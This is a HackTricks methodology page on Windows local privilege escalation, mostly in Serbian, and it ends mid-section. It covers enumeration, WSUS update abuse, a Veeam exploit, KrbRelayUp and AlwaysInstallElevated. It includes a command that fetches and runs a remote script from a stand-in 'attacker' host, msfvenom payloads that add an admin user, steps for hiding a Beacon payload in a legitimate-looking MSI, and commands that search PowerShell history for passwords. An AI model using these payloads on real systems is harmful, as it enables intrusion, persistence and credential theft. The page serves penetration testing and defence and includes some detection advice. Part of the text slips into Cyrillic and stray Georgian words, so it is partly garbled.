# Windows lokalna eskalacija privilegija

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za lokalnu eskalaciju privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko osnovnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije takođe se oslanja na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata DerbyCon prezentaciju o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Početne osnove Windows-a

### Access Tokens

**Ako ne znate šta su Windows access tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Više informacija o ACLs - DACLs/SACLs/ACEs potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

U Windows-u postoje različiti mehanizmi koji vam mogu **sprečiti enumeraciju sistema**, pokretanje izvršnih datoteka ili čak **otkriti vaše aktivnosti**. Pre početka enumeracije radi eskalacije privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **odbrambene mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup takođe može omogućiti da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac izmena memorije Windows `SYSTEM` procesa:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / tiha eskalacija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu biti zloupotrebljeni za dostizanje High IL bez upita za potvrdu, kada se zaobiđu AppInfo provere bezbedne putanje. Pogledajte namenski tok rada za zaobilaženje UIAccess/Admin Protection ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra za pristupačnost na Secure Desktop-u može biti zloupotrebljena za proizvoljno upisivanje u SYSTEM registar (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju sa **SMB proizvoljnim portom**, gde se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti u verziji Windows-a (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Eksploatacije specifične za verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu napada** koju predstavlja Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — prikuplja podatke o OS buildu, instaliranim ažuriranjima i potencijalno relevantnim savetima; pre nego što neki rezultat smatrate primenljivim, proverite tačan proizvod i naknadna ažuriranja koja zamenjuju postojeća.

Kod lokalnog exploita specifičnog za određenu verziju proverite **arhitekturu procesa koji se izvršava**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično preusmerava na 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. OS build ili kandidat za nedostajući KB ne dokazuje da je sistem ranjiv na exploit; uporedite build koji se izvršava, instalirana ili naknadna ažuriranja koja ga zamenjuju, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neke akreditive/Juicy informacije sačuvane u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell transcript datoteke

Možete da saznate kako da ovo uključite na stranici [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično upisuje podatke u fasciklu Documents svakog korisnika, ali podešavanje `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri fajlove u deljenu ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu putanju izlaznih podataka i ACL fajla: transkript može da sadrži argumente komandi i njihov izlaz, uključujući akreditive. Transkript kojem možete da pristupite predstavlja samo trag ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u odgovarajućem kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja ni rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files“ u dokumentaciji i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se kompletna aktivnost i pun sadržaj izvršavanja skripte, čime se osigurava dokumentovanje svakog bloka koda dok se izvršava. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaje evidentiranja za Script Block možete pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint je trag za proveru mogućeg presretanja metapodataka o ažuriranjima. Eksploatacija zavisi i od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i kakva su klijentova pravila poverenja i instalacije ažuriranja. Sam URL ne dokazuje mogućnost izvršavanja koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prvo proverite da li mreža koristi WSUS ažuriranje bez SSL-a tako što ćete pokrenuti sledeću komandu u cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od ovih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Time se potvrđuje preduslov za putanju presretanja HTTP saobraćaja, ali ne i da je presretanje moguće, da će zlonamerno ažuriranje biti prihvaćeno ili da se može instalirati sa povišenim privilegijama. Kada je vrednost `0`, ta konkretna konfigurisana WSUS krajnja tačka nije izabrana tom smernicom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su MiTM skripte za eksploataciju koje ubacuju „lažna“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Istraživanje možete pročitati ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Pročitajte ceo izveštaj ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U suštini, ovu grešku iskorišćava sledeći propust:

> Ako možemo da izmenimo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima programa Internet Explorer, možemo lokalno pokrenuti [PyWSUS](https://github.com/GoSecure/pywsus) da bismo presreli sopstveni saobraćaj i pokrenuli kod sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako napravimo თვით-მოწერილი sertifikat za ime hosta WSUS i dodamo ga u skladište sertifikatov trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme nalik HSTS-u za validaciju sertifikata po principu „prvo korišćenje uspostavlja poverenje“. Ako korisnik veruje predstavljenom sertifikatu i on ima odgovarajuće ime hosta, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zasebna putanja ako trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sva delegirana WSUS ovlašćenja, a zatim utvrdite koja grupa klijenata treba da primi odobreno ažuriranje. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju potpisnom sertifikatu koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju, potvrdite da je kandidat za ažuriranje potpisan i prihvaćen, da se odnosi na cilj i da se instalira u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju te uslove.

### Zloupotreba prilagođenih ažuriranja SUSDB: nepotpisani sadržaji preko `.txt`/`.esd`

Ovo je drugačiji propust u granici poverenja od presretanja HTTP veze sa WSUS serverom: preduslov je dovoljan pristup **procedurama uskladištenim u WSUS bazi podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način pristupa jeste prosleđivanje naloga WSUS računara uzvodno ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; konkretni preduslovi zavise od implementacije, zato prvo utvrdite dozvole `EXECUTE` umesto da pretpostavljate da imate administratorska prava za SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje WSUS klijentsku autentifikaciju sa HTTP/8530 ka LDAP-u, SMB-u ili AD CS-у, pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Napravite, odredite cilj i odobrite ažuriranje

Tok rada sa prilagođenim ažuriranjem koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvezite metapodatke ažuriranja | `spImportUpdate` |
| Sačuvajte XML fragmente za preduslove, lokalizaciju i proširene podatke | `spSaveXMLFragment` |
| Povežite sažetak sadržaja sa URL-om koji kontroliše napadač | `spSetBatchURL` |
| Izlistajte/napravite grupu računara i dodajte klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobrite instalaciju za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Naziv datoteke, sažeci, veličina i obrađivač `CommandLineInstallation` moraju da se podudaraju u uvezenim metapodacima i fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i primene, umesto da ponovo koristite GUID-ove iz primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, .NET putanja `VerifyFile` postavlja oznaku za proveru sertifikata na false kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE fajl, na primer `payload.exe.txt`, može da prođe proveru sadržaja i da ga kasnije pokrene rukovalac za instalaciju ažuriranja preko komandne linije. Ovo je greška u politici i zabuna oko tipa, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibilno stageovanje i automatizacija

Pozivom `spDeployUpdate` WSUS preuzima registrovani sadržaj. Izvor mora da ispunjava BITS-ova očekivanja za HTTP: dostupna URL adresa sama po sebi nije dovoljna, jer prenos koristi početni tok `HEAD`/`GET` i zahteve za opseg bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364` sa porukom da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/grupa/deployment, sadrži izmenjeni MSSQL klijent za njegovo izvršavanje i uključuje `BitsWebServer.py` za stageovanje sadržaja. Minimalno pokretanje u ovlašćenom laboratorijskom okruženju:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nepraćeno izvršavanje i postojanost kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od politike. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema podešenom rasporedu, bez potrebe da ga korisnik ručno izabere. Tokom testiranja, payload čije je ažuriranje ostalo neuspešno/nepotpuno odmah je ponovo ponuđen nakon što se callback proces završio, pa ponašanje pri ponovnom pokušaju može da postane trajni mehanizam za izvršavanje; ovo je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Mogućnosti za detekciju i ojačavanje

Korisne mogućnosti za analizu ove tehnike na strani servera i klijenta su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove ciljne grupe, spoljne izvore sadržaja, payload-e za ažuriranje `.txt`/`.esd` i deployments koje su izvršili neočekivani principal-и (naročito налози који нису рачунарски налози).
- Pregledajte `C:\Program Files\Update Services\LogFiles` у потрази за `ContentSyncAgent`, `FileVerified`, погрешно написаним `FileVerficationFailed` и `EventId=364`; повежите верификацију са екстензијом payload-а и магичним бајтовима садржаја, уместо да верујете суфиксу.
- Тражите случајеве у којима инсталација Windows Update-а више пута не успева/поново покушава, као и PE извршавање или неочекиване child/network активности од садржаја са називима `.txt` или `.esd`.
- Захтевајте Extended Protection for Authentication на database service-у тамо где је подржано и ограничите мрежни приступ database-у на WSUS server и овлашћене административне системе. Сведите `EXECUTE` права на процедуре за custom-update на минимум и вршите њихову ревизију.

## Аутоматски програми за ажурирање трећих страна и Agent IPC (локални privesc)

Многи enterprise агенти излажу localhost IPC површину и привилеговани канал за ажурирање. Ако се упис може преусмерити на attacker server, а програм за ажурирање верује лажном root CA-у или има слабе провере потписника, локални корисник може да испоручи злонамерни MSI који ће SYSTEM service инсталирати. Генерализовану технику (засновану на ланцу Netskope stAgentSvc – CVE-2025-0309) погледајте овде:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM преко TCP 9401)

Veeam Backup & Replication и Cloud Connect подразумевано користе основни backup service на **TCP/9401**. [Veeam-ово обавештење](https://www.veeam.com/kb4424) описује откривање нешифрованих credentials за конфигурациону базу података унутар мрежног периметра backup-а без аутентификације; засебан јавни PoC показује путању за извршавање команди као **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service може да се веже за адресу која није localhost, па проверите његову стварну адресу и PID.

- **Recon**: потврдите да TCP/9401 припада процесу `Veeam.Backup.Service.exe`, па проверите инсталирани производ и метаподатке о закрпама. `netstat -ano | findstr 9401` и `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` су назнаке, а не потпуна провера закрпа.
- **Fixed floors**: Veeam наводи **11a build 11.0.1.1261 P20230227** и **12 build 12.0.0.1420 P20230223** као прва исправљена издања; ранија издања су рањива. Четвороделна верзија датотеке сама по себи не може да разликује незакрпљену основну верзију од касније закрпе на истим бројевима верзије. Пре него што прогласите граничну верзију исправљеном, проверите идентификатор закрпе у [историји верзија произвођача](https://www.veeam.com/kb2680).
- **Exploit**: поставите PoC као што је `VeeamHax.exe` заједно са потребним Veeam DLL-овима у исти директоријум, а затим покрените SYSTEM payload преко локалног сокета:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Citirani PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.
## KrbRelayUp

Lokalni Kerberos relay može da omogući prelaz sa prijave sa nižim privilegijama na privilegovano upisivanje u direktorijum kada se odgovarajući COM server autentifikuje, a relayed principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva odgovarajuću delegaciju i prava nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis key-credential vrednosti i KDC koji podržava putanju autentifikacije pomoću sertifikata. Nijedna od ovih putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za relayed identitet i nivoe autentifikacije i impersonation izabrane COM klase. Važni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Rutiranje kroz firewall/OXID i instalirana ažuriranja takođe mogu da utiču na rezultat. Permisivnu smernicu ili ACL koji odgovara uslovima tretirajte kao nešto što treba proveriti; pasivno nabrajanje ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential mašinskog naloga može da dovede do mašinskog tiketa i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da umotate „**.bat**“ fajl ako samo želite da **izvršite** **komandne linije**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite „installer“. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dajte projektu ime, na primer **AlwaysPrivesc**, za lokaciju koristite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do koraka 3 od 4 (izbor fajlova za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u**, a zatim u **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite fajl **beacon.exe** i kliknite na **OK**. Time ćete osigurati da se Beacon payload izvrši čim se pokrene instalacioni program.
- U okviru **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite ga**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste podesili platformu na x64.

### Instalacija MSI-ja

Da biste **instalaciju** zlonamernog `.msi` fajla izvršili **u pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirusni programi i detektori

### Postavke revizije

Ove postavke određuju šta se **beleži**, zato obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju dnevnici.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administrator naloga**, čime se obezbeđuje da svaka lozinka na računarima pridruženim domenu bude **jedinstvena, nasumično generisana i redovno ažurirana**. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su preko ACL-ova dodeljene dovoljne dozvole da vide lozinke lokalnog administratora.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u otvorenom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA zaštita

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, dodatno štiteći sistem.\
[**Više informacija o LSA zaštiti ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani kredencijali

